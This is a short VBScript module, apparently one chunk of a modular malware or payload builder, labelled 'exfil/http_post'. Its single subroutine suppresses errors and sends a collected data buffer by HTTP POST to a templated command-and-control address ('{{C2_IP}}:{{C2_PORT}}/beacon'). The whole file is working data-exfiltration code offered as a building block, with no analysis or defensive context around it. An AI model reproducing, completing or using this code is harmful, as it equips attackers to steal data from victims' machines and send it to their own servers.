' chunk: exfil/http_post
' depends: core/emit_buffer
' provides: exfil_http
' format: vbscript

Sub exfil_http()
    On Error Resume Next
    Dim h
    Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
    h.Open "POST", "http://{{C2_IP}}:{{C2_PORT}}/beacon", False
    h.SetRequestHeader "Content-Type", "application/octet-stream"
    h.Send _buf
    On Error GoTo 0
End Sub
